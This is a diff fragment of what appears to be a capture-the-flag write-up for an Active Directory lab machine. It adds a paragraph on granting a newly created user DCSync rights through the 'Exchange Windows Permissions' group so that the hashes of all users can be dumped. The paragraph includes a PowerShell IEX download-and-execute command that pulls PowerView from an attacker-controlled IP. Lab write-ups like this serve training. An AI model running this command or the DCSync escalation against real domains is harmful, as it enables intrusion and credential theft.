@@ -45,4 +45,6 @@ The command completed successfully.
 
 *Evil-WinRM* PS clark:\>
 ```
+After creating new user `stuart` and adding it to `Exchange Windows Permissions` group, we can use `powerview.ps1`(uploaded to forest machine using command `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.105:8000/powerview.ps1')`) to grant `stuart` newly created user who is member of `Exchange Windows Permissions` group `DCSync` rights privilege after which newly created `stuart` user can dump hashes of all users on forest machine.
+
 
